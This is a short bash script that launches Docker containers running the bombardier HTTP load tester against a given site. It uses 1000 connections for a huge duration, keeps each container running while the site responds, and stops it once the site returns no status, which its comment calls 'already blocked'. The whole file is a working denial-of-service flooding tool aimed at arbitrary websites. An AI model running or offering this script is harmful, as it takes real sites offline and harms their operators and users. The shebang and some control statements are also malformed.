#!bin/bash

# Configuration of Bombardier
BOMBARDIER_TIMEOUT=600000s
BOMBARDIER_CONNECTIONS=1000

site=$1
containersLimit=$2

runningContainers=$(docker ps -q | wc -l);
runningContainers=${runningContainers##*( )}
if [[ "$containersLimit" -lt "$runningContainers" ]];
then
  echo "$runningContainers already running. Can't add more"
  return;
fi

container_name=${site##*//}
container_name=${container_name%/}
container_name=${container_name%%/*}
containers=$(docker ps --filter name=$container_name)

status_code=$(curl -m 2 -o /dev/null -s -w "%{http_code}" "$site")
status_code=$(expr "$status_code" + 0)

# If status code is zero site is already blocked
site_status="${site} status code ${status_code}"
echo "$site_status"
if (($status_code != 0 && $status_code <= 400)); then
  if [[ "$containers" != *"$container_name"* ]];
  then
      docker run --name=$container_name -ti -d --rm alpine/bombardier -c $BOMBARDIER_CONNECTIONS -d $BOMBARDIER_TIMEOUT -l $site
      echo "$container_name has been launched"
      continue;
  fi
elif (($status_code == 0));
then
  if [[ "$containers" == *"$container_name"* ]];
  then
      docker kill $container_name
      echo "$container_name has been stopped"
  fi
fi
